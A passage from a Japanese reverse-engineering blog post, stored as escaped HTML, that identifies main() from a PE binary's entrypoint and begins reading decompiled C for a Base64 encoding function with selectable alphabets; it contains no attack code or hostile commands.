6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;entrypointからmain関数を特定する&lt;/h3&gt;
&lt;p&gt;PEバイナリを実行する場合、entrypointでは初期化処理の後にmain関数が呼び出され、その後exitプロセスが呼び出されます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.bigmessowires.com/2015/10/02/what-happens-before-main/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;What Happens Before main() | Big Mess o’ Wires&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/* 中略 */&lt;/span&gt;
FID_conflict&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;__get_initial_narrow_environment&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;thunk_FUN_0043c3a2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;thunk_FUN_0043c39c&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
unaff_ESI &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;thunk_FUN_004078f0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
uVar7 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;___scrt_is_managed_app&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;uVar7 &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;bVar2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    	&lt;span class=&quot;token function&quot;&gt;__cexit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;___scrt_uninitialize_crt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token char&quot;&gt;&apos;\x01&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token char&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;in_FS_OFFSET &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_14&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; unaff_ESI&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;/* 中略 */&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;つまり、上記のデコンパイル結果でいうところの&lt;code class=&quot;language-text&quot;&gt;___scrt_is_managed_app()&lt;/code&gt;の直前の行で呼び出している&lt;code class=&quot;language-text&quot;&gt;thunk_FUN_004078f0()&lt;/code&gt;がmain関数であることがわかります。&lt;/p&gt;
&lt;h3 id=&quot;base64encode関数のデコンパイル結果を読む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#base64encode%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%AB%E7%B5%90%E6%9E%9C%E3%82%92%E8%AA%AD%E3%82%80&quot; aria-label=&quot;base64encode関数のデコンパイル結果を読む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Base64Encode関数のデコンパイル結果を読む&lt;/h3&gt;
&lt;p&gt;次は、main関数から辿っていき、Base64Encode関数のデコンパイル結果を読んでいきます。&lt;/p&gt;
&lt;p&gt;当然ですが、ソースコードの見え方とはかなり変わっており、読みづらくなってますね。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; __cdecl &lt;span class=&quot;token function&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; param_1&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; param_2&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; param_3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pcVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_2c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; local_28&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_10&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_8&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    pcVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    local_2c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    local_28 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token char&quot;&gt;&apos;=&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_00467f24&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_c &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; param_3&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        local_2c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;PTR_s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_00467f28&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_c &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        local_28 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;DAT_00467f2c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;local_c &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    pcVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;thunk_FUN_0041973b&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_2 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pcVar1 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      pcVar1 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      local_c &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pcVar1&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; param_2&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; local_10&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; local_10 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_10 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_10 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_2c&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          local_8&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_2c&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3U&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          local_8&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_28&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          local_8&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_28&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;local_10 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;local_8 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_2c&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          local_8&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_2c&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3U&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;
                                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xfU&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          local_8&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_2c&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;param_1 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; local_c &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xfU&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
          local_8&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; local_28&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
